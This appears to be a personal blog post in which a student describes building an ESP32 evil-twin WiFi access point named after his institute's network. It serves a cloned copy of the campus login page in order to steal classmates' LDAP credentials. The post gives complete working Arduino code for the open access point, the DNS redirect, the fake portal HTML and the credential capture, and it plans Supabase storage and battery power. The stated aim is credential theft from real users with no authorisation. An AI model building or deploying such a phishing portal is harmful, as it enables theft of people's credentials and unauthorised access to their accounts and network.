+++
title = "WiFi spoofing part A: Creating a honeypot using ESP32"
date = 2025-01-23
draft = false

[taxonomies]
categories = ["Hacking", "Hardware"]
tags = ["Hardware", "Networks", "Cysec", "blog"]

[extra]
lang = "en"
+++

My college has LDAP credentials that we supposed to use to get access to the ethernet. There is a `netaccess.iitm.ac.in` page that asks for these creds whenever you login to a new network. Now if multiple people are connected to the same network and anyone person also authenticates, everyone gets access. Its weird, but thats not why we are here.

# Idea

The idea here is, I wanted to create a `honeypot` which will be a wifi network with the same name as my institute wifi **iitmwifi**. If user's click on this and enter their LDAP credentials, I shall get it!

It turns out that it's not that simple. 

- I can't directly act as an `ISP` using just a wifi adapter (at least that's what I think, I am still reseraching this area) so I can't really provide internet access at all. But that's alright I can just get the creds and tell them to fuck off.

- I have to keep the wifi open and not protected.

The reason is simple. I don't have their credentials so there is no way of authenticating and if they don't know the password, they will never be able to connect! You're probably thinking

> Dude! They'll type their credentials thinking its the real wifi so you steal it then.

That won't work because due to security reasons ESP won't allow me to check what `password` was used in a login attempt.

> [!IMPORTANT]
> But I can always authenticate them later!

I let them see the wifi as free initially, then as soon as they press **connect** it redirects them to a site that `looks` exactly like `netaccess.iitm.ac.in` where everyone is **used to** giving their credentials. 

This will make them lower their guard and type in their LDAP creds hoping to finally get internet access (hence not being an ISP plays into my advantage) and that's when I steal them. 

# Code

This is the ESP code that I wrote. The HTML contents were made using some ChatGPT and trial and error. I even called a friend to make it for me but turns out its not that hard to make a simple HTML file with minimal javascript and functionality.
```c
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const char* HONEYPOT_SSID = "iitmwifi_6g";
const char* HONEYPOT_PASSWORD = NULL;

WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); // Static IP for the ESP32 access point

void handleLogin() {
  if (server.method() == HTTP_POST) {
    String username = server.arg("username");
    String password = server.arg("password");
    
    // Log attempt (you can reuse previous logging logic)
    Serial.println("Login Attempt:");
    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Password: ");
    Serial.println(password);
    
    // Fake authentication response
    server.send(200, "text/html", "Authentication in progress...");
  } else {
    // Handle GET request
    server.send(404, "text/plain", "Method not allowed");
  }
}

void handleCaptive() {
  // Redirect all requests to the login page
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  
  // Configure static IP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(HONEYPOT_SSID, HONEYPOT_PASSWORD);

  // Start DNS server to redirect all domain requests
  dnsServer.start(DNS_PORT, "*", apIP);

  // Setup web server routes
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.onNotFound(handleCaptive);
  
  server.begin();
  
  Serial.println("Captive Portal Started");
  Serial.print("Connect to WiFi and visit: ");
  Serial.println(apIP);
}

void handleRoot() {
  String welcomePage = R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f9fa;
            color: #333;
        }

        .container {
            width: 90%;
            max-width: 600px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h1, h2 {
            color: #000;
            margin-bottom: 15px;
        }

        form {
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        p, ol {
            margin-bottom: 15px;
        }

        a {
            color: #007bff;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        code {
            background-color: #f1f1f1;
            padding: 2px 5px;
            border-radius: 3px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Please Log in</h1>
        <form action="/login" method="post">
            <label for="username">Username</label>
            <input type="text" id="username" placeholder="username" name="username">
            <p>Your login ID (LDAP)</p>

            <label for="password">Password</label>
            <input type="password" id="password" placeholder="password" name="password">

            <button type="submit">Log in</button>
            
        <p><strong>Note:</strong> All students should already be having an LDAP account that they use for hproxy authentication.</p>
        <p>
            For users with ADS logins (ie, your email address is of the form <code>@iitm.ac.in</code>) who have not yet activated their accounts:
        </p>
        <ol>
            <li>Go to <a href="https://cc.iitm.ac.in" target="_blank">https://cc.iitm.ac.in</a></li>
            <li>Login (on the right) using your ADS credentials</li>
            <li>Menus on the right to go to <strong>eservices -- My LDAP -- Reset LDAP Password</strong>.</li>
        </ol>
        <h2>Speed Test</h2>
        <p>
            In case you suspect that the network is not working properly in your area, please use the speed test at this link:
            <a href="#">LAN Speed Test</a>. Your IP address and speed will be automatically recorded. Any feedback that could help us debug problems is greatly appreciated.
        </p>
        <p><strong>Note on the speed test:</strong> this only tells you whether your connection to the CC core is good and helps us debug switch-level problems.</p>
    </div>
</body>
</html>
  )HTML";
  
  server.send(200, "text/html", welcomePage);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
```

I saved this as an .ino file and uploaded using `Arduino IDE`. It worked beautifully!

# Supabase

Another thing I thought of implementing was adding functionality to directly save the credentials in a supabase table. It woudn't be that hard because I have done it before for `Agnirath` (which is where I work as an electrical engineer).

# Making it a self-sustaining thing

I added a battery to this! The battery is a 11V but I need maximum 5V to power the ESP (via the 5V pin), so I used a motor driver that was kept nearby. I didn't have a buck converter and the motor driver had a built in LDO for converting 12V to 5V. The battery discharged to 5V pretty quicky cause of the LDO, so now I am using it directly.


The only problem here is getting people to `look` at this new network. For this I will have to think of something else.